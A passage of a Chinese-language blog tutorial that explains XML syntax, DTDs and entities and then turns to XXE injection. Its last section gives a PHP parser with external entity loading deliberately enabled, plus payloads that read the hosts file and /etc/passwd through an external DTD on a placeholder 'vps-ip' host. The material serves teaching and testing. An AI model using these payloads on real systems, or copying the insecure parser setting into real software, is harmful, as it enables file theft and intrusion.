href="#1-4-PCDATA" class="headerlink" title="1.4 PCDATA"></a>1.4 PCDATA</h2><p><strong>被解析的字符，文本</strong></p><p>不能含有 特殊字符</p><h2 id="1-5-CDATA"><a href="#1-5-CDATA" class="headerlink" title="1.5 CDATA"></a>1.5 CDATA</h2><p><strong>不会被解析的字符，文本</strong></p><p>当需要显示的特殊符号偏多，但又不想使用实体的引用时，可使用 CDATA，它指的是不应该由 XML解释器进行解析的文本数据。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#使用</span></span><br><span class="line">&lt;![CDATA[文本数据]]&gt;</span><br><span class="line"><span class="comment">#例子：&lt;eye&gt;&lt;![CDATA[&lt;sdsdj&gt;&gt;&gt;&amp;&amp;dfd&#x27;f&quot;]]&gt;big&lt;/eye&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/01/bsrz3YOW4MdU6qe.png" alt="image-20210426210731208"></p><h2 id="1-6-XML-属性-与-元素"><a href="#1-6-XML-属性-与-元素" class="headerlink" title="1.6 XML 属性 与 元素"></a>1.6 XML 属性 与 元素</h2><p><strong>属性：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">day</span>=<span class="string">&quot;10&quot;</span> <span class="attr">month</span>=<span class="string">&quot;01&quot;</span> <span class="attr">year</span>=<span class="string">&quot;2008&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">to</span>=<span class="string">&quot;Tove&quot;</span> <span class="attr">from</span>=<span class="string">&quot;Jani&quot;</span> <span class="attr">heading</span>=<span class="string">&quot;Reminder&quot;</span></span></span><br><span class="line"><span class="tag"><span class="attr">body</span>=<span class="string">&quot;Don&#x27;t forget me this weekend!&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#缺点：</span></span><br><span class="line">属性不能包含多个值</span><br><span class="line">不能包含树结构</span><br><span class="line">不容易扩展</span><br><span class="line">难以阅读</span><br></pre></td></tr></table></figure><p><strong>元素：</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">date</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">day</span>&gt;</span>10<span class="tag">&lt;/<span class="name">day</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">month</span>&gt;</span>01<span class="tag">&lt;/<span class="name">month</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">year</span>&gt;</span>2008<span class="tag">&lt;/<span class="name">year</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">date</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>建议：使用元素</strong></p><p><strong>特别的：ID属性，便于访问XML元素</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">messages</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">id</span>=<span class="string">&quot;p501&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget me this weekend!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span> <span class="attr">id</span>=<span class="string">&quot;p502&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>Jani<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>Tove<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Re: Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>I will not!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">messages</span>&gt;</span> </span><br></pre></td></tr></table></figure><h2 id="1-7-XML在浏览器中的显示"><a href="#1-7-XML在浏览器中的显示" class="headerlink" title="1.7 XML在浏览器中的显示"></a>1.7 XML在浏览器中的显示</h2><p><strong>显示：单独的 XML 文档不会携带有关如何显示数据的信息，直接将XML的源码显示出来。</strong></p><p><strong>方法：</strong></p><ul><li><p><strong>链接到CSS文件</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml-stylesheet type=&quot;text/css&quot; href=&quot;cd_catalog.css&quot;?&gt;</span><br></pre></td></tr></table></figure><p>使用 CSS 格式化 XML 不是常用的方法</p></li><li><p><strong>使用 XSLT，把 XML 文档转换成 HTML 格式显示</strong></p><p>XSLT 是首选的 XML 样式表语言，当浏览器读取 XML 文件时，XSLT 转换是由浏览器完成的</p><p>使用 XSLT 来转换 XML 时，不同的浏览器可能会产生不同结果。为了减少这种问题，可以在服务器上进行 XSLT 转换。</p><p><img src="https://i.loli.net/2021/10/01/ldOAweu4xsMIWkr.png" alt="image-20210427172835529"></p></li></ul><h2 id="1-8-XML-的解析"><a href="#1-8-XML-的解析" class="headerlink" title="1.8 XML 的解析"></a>1.8 XML 的解析</h2><p>所有现代浏览器都有内建的 XML 解析器。</p><p>XML 解析器把 XML 文档转换为 XML DOM 对象 - 可通过 JavaScript 操作的对象。</p><p><strong>XML DOM</strong> :</p><p>XML DOM（XML Document Object Model）定义了访问和操作 XML 文档的标准方法，把 XML 文档作为树结构来查看。</p><p>通过 DOM 树可以 访问 和 修改或删除 它们的内容，并 创建新的元素。</p><p><strong>有两种基本的 XML 解析器类型：</strong></p><ul><li>基于树的解析器：这种解析器把 XML 文档转换为树型结构。它分析整篇文档，并提供了对树中元素的访问，例如文档对象模型 (DOM)。</li><li>基于事件的解析器：将 XML 文档视为一系列的事件。当某个具体的事件发生时，解析器会调用函数来处理。</li></ul><p>DOM 解析器是基于树的解析器。</p><h3 id="1-8-1-PHP-XML-DOM"><a href="#1-8-1-PHP-XML-DOM" class="headerlink" title="1.8.1 PHP XML DOM"></a>1.8.1 PHP XML DOM</h3><p>内建的 DOM 解析器使在 PHP 中处理 XML 文档成为可能。</p><p>也就是说DOM XML 解析器函数是 PHP 核心的组成部分。无需安装就可以使用这些函数。</p><p><strong>示例：</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#xml：&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE message [&lt;!ELEMENT message (hair,country,eye,body)&gt;&lt;!ELEMENT hair (#PCDATA)&gt;&lt;!ELEMENT country (#PCDATA)&gt;&lt;!ELEMENT eye (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt;&lt;message&gt;    &lt;hair&gt;Black&lt;/hair&gt;    &lt;country&gt;China&lt;/country&gt;    &lt;eye&gt;big&lt;/eye&gt;    &lt;body&gt;You are handsome!&lt;/body&gt;&lt;/message&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php:直接输出&lt;?php$xmlDoc = new DOMDocument();#创建DOMDocument对象$xmlDoc-&gt;load(&quot;test.xml&quot;);#将test.xml加载进去print $xmlDoc-&gt;saveXML();#把内部 XML 文档放入一个字符串，用于输出?&gt; </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php:遍历 XML&lt;?php$xmlDoc = new DOMDocument();$xmlDoc-&gt;load(&quot;test.xml&quot;);$x = $xmlDoc-&gt;documentElement;foreach ($x-&gt;childNodes AS $item)&#123;    print $item-&gt;nodeName . &quot; = &quot; . $item-&gt;nodeValue . &quot;&lt;br&gt;&quot;;&#125;?&gt; </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#php:SimpleXML&lt;?php$xml=simplexml_load_file(&quot;test.xml&quot;);print_r($xml);?&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$xml</span>=simplexml_load_file(<span class="string">&quot;test.xml&quot;</span>);<span class="built_in">echo</span> <span class="variable">$xml</span>-&gt;hair . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="built_in">echo</span> <span class="variable">$xml</span>-&gt;country . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="built_in">echo</span> <span class="variable">$xml</span>-&gt;eye . <span class="string">&quot;&lt;br&gt;&quot;</span>;<span class="built_in">echo</span> <span class="variable">$xml</span>-&gt;body;?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php<span class="variable">$xml</span>=simplexml_load_file(<span class="string">&quot;test.xml&quot;</span>);<span class="built_in">echo</span> <span class="variable">$xml</span>-&gt;getName() . <span class="string">&quot;&lt;br&gt;&quot;</span>; foreach(<span class="variable">$xml</span>-&gt;children() as <span class="variable">$child</span>)&#123;    <span class="built_in">echo</span> <span class="variable">$child</span>-&gt;getName() . <span class="string">&quot;: &quot;</span> . <span class="variable">$child</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;&#125;?&gt;</span><br></pre></td></tr></table></figure><p> <a href="https://www.runoob.com/dom/dom-tutorial.html">XML DOM 教程</a></p><h2 id="1-9-文档结构-—-树结构"><a href="#1-9-文档结构-—-树结构" class="headerlink" title="1.9 文档结构 — 树结构"></a>1.9 文档结构 — 树结构</h2><ul><li><strong>XML声明</strong></li><li><strong>DTD文档类型定义（可选）</strong></li><li><strong>文档元素</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;&lt;note&gt;<span class="comment">#根元素，与其它元素之间是 父子关系;各个子元素之间：同胞关系&lt;to&gt;Tove&lt;/to&gt;#四个子元素：to,from,heading,body&lt;from&gt;Jani&lt;/from&gt;&lt;heading&gt;Reminder&lt;/heading&gt;&lt;body&gt;Don&#x27;t forget me this weekend!&lt;/body&gt;&lt;/note&gt;</span></span><br></pre></td></tr></table></figure><h3 id="1-9-1-XML声明"><a href="#1-9-1-XML声明" class="headerlink" title="1.9.1 XML声明"></a>1.9.1 XML声明</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;<span class="comment">#XML声明: 用于告诉浏览器这是一个xml文档；当看到该声明时，浏览器会自动调用 xml解释器 运行该xml文档#version属性：用于说明当前xml文档的版本，属性必须#encodeing属性：用于说明当前xml文档使用的字符编码集，xml解析器会使用这个编码来解析xml文档，属性可选</span></span><br></pre></td></tr></table></figure><h3 id="1-9-2-DTD文档类型定义（可选）"><a href="#1-9-2-DTD文档类型定义（可选）" class="headerlink" title="1.9.2 DTD文档类型定义（可选）"></a>1.9.2 DTD文档类型定义（可选）</h3><p><strong>DTD(Document Type Definition) 即 文档类型定义</strong>，作用是定义 XML 文档的合法构建模块，这个模块里面 <code>定义了用户自己创建的根元素以及对应的子元素和根元素的合法子元素和属性</code>，那么文档中的所有元素都必须以该DTD为模板, <code>用于对XML的元素的内容进行相应的规范化</code>。</p><p><strong>作用：验证你的XML</strong></p><p><strong>格式：定义元素</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [<span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>]&gt;</span></span><br></pre></td></tr></table></figure><p>注：W3C 支持一种基于 XML 的 DTD 代替者，它名为 XML Schema</p><p><a href="https://www.runoob.com/schema/schema-tutorial.html">XML Schema 菜鸟教程</a></p><p><a href="https://www.freebuf.com/column/156863.html">使用 XML Schema 攻击</a></p><p><strong>定义实体：</strong></p><p>除了在 DTD 中定义 <strong>元素</strong>（其实就是对应 XML 中的标签）以外，我们还能在 DTD 中 <strong>定义实体</strong> (对应XML 标签中的内容)</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe <span class="string">&quot;test&quot;</span>&gt;]&gt;&lt;creds&gt;    &lt;user&gt;&amp;xxe;&lt;/user&gt;    &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;</span><br></pre></td></tr></table></figure><p>实体可以从 <strong>外部的 dtd 文件</strong> 中引用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///c:/test.dtd&quot;</span> &gt;]&gt;&lt;creds&gt;    &lt;user&gt;&amp;xxe;&lt;/user&gt;    &lt;pass&gt;mypass&lt;/pass&gt;&lt;/creds&gt;dtd:&lt;!ENTITY xxe SYSTEM <span class="string">&quot;file:///d://test1.txt&quot;</span>&gt; </span><br></pre></td></tr></table></figure><p><strong>声明方式</strong></p><ul><li><p>内部声明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;#例如&lt;!DOCTYPE message [&lt;!ELEMENT message (hair,country,eye,body)&gt;&lt;!ELEMENT hair (#PCDATA)&gt;&lt;!ELEMENT country (#PCDATA)&gt;&lt;!ELEMENT eye (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; ]&gt;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/01/XEiQ1UWsDwMqoKk.png" alt="image-20210427173839979"></p></li><li><p>外部声明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#例如：&lt;!DOCTYPE message SYSTEM &quot;message.dtd&quot;&gt;#message.dtd&lt;!ELEMENT message (hair,country,eye,body)&gt;&lt;!ELEMENT hair (#PCDATA)&gt;&lt;!ELEMENT country (#PCDATA)&gt;&lt;!ELEMENT eye (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt; </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/01/1MXarQISDvh8kjC.png" alt="image-20210427173804619"></p></li></ul><h1 id="二、DTD"><a href="#二、DTD" class="headerlink" title="二、DTD"></a>二、DTD</h1><h2 id="2-1-元素声明"><a href="#2-1-元素声明" class="headerlink" title="2.1 元素声明"></a>2.1 元素声明</h2><ul><li><p>普通声明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT element-name category&gt;或&lt;!ELEMENT element-name (element-content)&gt; </span><br></pre></td></tr></table></figure></li><li><p>空元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT element-name EMPTY&gt;实例:&lt;!ELEMENT br EMPTY&gt;XML example:&lt;br /&gt; </span><br></pre></td></tr></table></figure></li><li><p>PCDATA元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT element-name (#PCDATA)&gt;</span><br></pre></td></tr></table></figure></li><li><p>带有任何内容的元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT element-name ANY&gt;</span><br></pre></td></tr></table></figure></li><li><p>带有子元素的声明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT element-name (child1)&gt;&lt;!ELEMENT element-name (child1,child2,...)&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例子：要按顺序&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt; </span><br></pre></td></tr></table></figure></li><li><p>只出现一次的元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT element-name (child-name)&gt;</span><br></pre></td></tr></table></figure></li><li><p>最少出现一次的元素</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT element-name (child-name+)&gt;</span><br></pre></td></tr></table></figure></li><li><p>出现零次或多次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT element-name (child-name*)&gt;</span><br></pre></td></tr></table></figure></li><li><p>出现零次或一次</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT element-name (child-name?)&gt;</span><br></pre></td></tr></table></figure></li><li><p>其它</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,header,(message|body))&gt; &lt;!ELEMENT note (#PCDATA|to|from|header|message)*&gt; </span><br></pre></td></tr></table></figure></li></ul><h2 id="2-2-属性声明"><a href="#2-2-属性声明" class="headerlink" title="2.2 属性声明"></a>2.2 属性声明</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ATTLIST element-name attribute-name attribute-type attribute-value&gt;</span><br></pre></td></tr></table></figure><p><a href="https://www.runoob.com/dtd/dtd-attributes.html">属性类型</a></p><h2 id="2-3-实体"><a href="#2-3-实体" class="headerlink" title="2.3 实体"></a>2.3 实体</h2><p>前面了解到DTD是用来定义XML文档当中的元素的，用于规范他们，实际上，它还  用于定义引用普通文本或特殊字符的快捷方式的变量（即 实体）。</p><p>实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用。</p><h3 id="2-3-1-普通实体"><a href="#2-3-1-普通实体" class="headerlink" title="2.3.1 普通实体"></a>2.3.1 普通实体</h3><ul><li><p>内部声明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY entity-name &quot;entity-value&quot;&gt; </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#实体的引用：&amp;，实体名称，分号</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例子：&lt;!ENTITY day &quot;10&quot;&gt; XML:&lt;day&gt;&amp;day;&lt;/day&gt;</span><br></pre></td></tr></table></figure></li><li><p>外部声明</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI/URL&quot;&gt;&lt;!ENTITY 实体名称 PUBLIC &quot;DTD标识名&quot; &quot;公用DTD的URI&quot;区别:    PUBLIC是指公用DTD,其是某个权威机构制定，供特定行业或公司.    SYSTEM是指该外部DTD文件是私有的，即我们自己创建的，没有公开发行，只是个人或在公司内部或者几个合作单位之间使用.    公用DTD使用PUBLIC代替了原来的SYSTEM，并增加了DTD标识名。</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/01/cAwrFKT9kLe1oqR.png" alt="image-20210428192136904"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">例子：test1.dtd:&lt;!ENTITY test SYSTEM &quot;file:///d://test1.txt&quot;&gt;XML：&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;!DOCTYPE test SYSTEM &quot;file:///d://test1.dtd&quot;&gt;&lt;author&gt;&amp;test;&lt;/author&gt; </span><br></pre></td></tr></table></figure></li></ul><h3 id="2-3-2-参数实体"><a href="#2-3-2-参数实体" class="headerlink" title="2.3.2 参数实体"></a>2.3.2 参数实体</h3><p>仅仅在DTD中使用的解析实体</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#内部声明: ENTITY关键字、百分号、名称和替换值&lt;!ENTITY % 实体名称 &quot;实体值&quot;&gt;#外部声明&lt;!ENTITY % 实体名称 SYSTEM &quot;URI&quot;&gt;%实体名;#实体的引用&lt;x&gt;%实体名;&lt;/x&gt;</span></span><br></pre></td></tr></table></figure><p>注：</p><ol><li><p>%两边的空格不能少</p></li><li><p>参数实体不能像普通实体那样在xml文档内容中进行引用，它的引用范围只在 <strong>当前xml文件的DTD声明</strong> 中，或者是 <strong>当前的DTD文件</strong> 中</p></li><li><p>在DTD中，所有参数实体必须在引用之前进行声明</p></li><li><p>参数实体对 无回显XXE 的利用 起了至关重要的作用</p></li></ol><p><a href="https://www.runoob.com/schema/schema-tutorial.html">XML Schema 菜鸟教程</a></p><h1 id="三、XXE"><a href="#三、XXE" class="headerlink" title="三、XXE"></a>三、XXE</h1><p>**XML External Entity —  XML外部实体注入漏洞 ** , 发生在 <code>应用程序解析XML输入</code>时，没有禁止外部实体的加载 （ <code>与该选项有关libxml_disable_entity_loader (false);</code>），导致可加载恶意外部文件和代码，造成任意文件读取、命令执行、内网端口扫描、攻击内网网站、发起Dos攻击 等危害。</p><p><strong>概述</strong>：攻击者通过 <strong>向服务器注入指定的xml实体内容</strong> ，从而让服务器按照指定的配置进行执行,导致问题。也就是说服务端 <strong>接收和解析</strong> 了来自用户端的xml数据,而又没有做严格的安全控制,从而导致 xml外部实体注入。</p><p><strong>产生点：</strong></p><ul><li>文档类型定义时，可以引用外部的 DTD 文件</li><li>XML解析器解析外部实体时支持多种协议（file :///, http:// 等）</li></ul><p><strong>利用点：</strong></p><p>​    通过构造恶意的外部实体，当XML解析器解析了我们所包含的恶意实体时便会触发漏洞  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">现在很多语言里面对应的解析xml的函数默认是禁止解析外部实体内容的,从而也就直接避免了这个漏洞。<span class="comment">#以PHP为例,在PHP里面解析xml用的是libxml，其在≥2.9.0的版本中,默认是禁止解析xml外部实体内容的。</span></span><br></pre></td></tr></table></figure><p><strong>危害</strong></p><ul><li>文件读取</li><li>RCE执行</li><li>内网攻击</li><li>Dos攻击</li></ul><h2 id="3-1-利用"><a href="#3-1-利用" class="headerlink" title="3.1 利用"></a>3.1 利用</h2><h3 id="3-1-1-有回显"><a href="#3-1-1-有回显" class="headerlink" title="3.1.1 有回显"></a>3.1.1 有回显</h3><p><strong>通过正常的回显将 外部实体 中的内容读取出来</strong></p><h4 id="测试："><a href="#测试：" class="headerlink" title="测试："></a>测试：</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>        libxml_disable_entity_loader (<span class="literal">false</span>);<span class="comment">//禁用加载外部实体的功能，禁用（TRUE）或启用（FALSE）libxml扩展（如DOM，XMLWriter和XMLReader）来加载外部实体    $xmlfile = file_get_contents(&#x27;php://input&#x27;);    $dom = new DOMDocument();//创建一个DOM对象    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); //加载XML//LIBXML_NOENT  替代实体//LIBXML_DTDLOAD 加载外部子集    $creds = simplexml_import_dom($dom);//该函数把 DOM 节点转换为 SimpleXMLElement 对象    echo $creds;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p><strong>引入内部实体</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span> <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xxe</span> [  <span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///c:/windows/system32/drivers/etc/hosts&quot;</span>&gt;</span> ]&gt;</span> <span class="tag">&lt;<span class="name">creds</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/01/BPJbaF2HVAKTXjg.png" alt="image-20210427191038850"></p><hr><hr><p><strong>引入外部参数实体 —– 题目当中经常使用的一个点</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;&lt;!DOCTYPE test [    &lt;!ENTITY % file SYSTEM &quot;http://vps-ip/hack.dtd&quot;&gt;    %file;]&gt;&lt;test&gt;&amp;hhh;&lt;/test&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hack.dtd&lt;!ENTITY hhh SYSTEM &#x27;file:///etc/passwd&#x27;&gt;</span><br></pre></td></tr></table></figure><hr><hr><figure 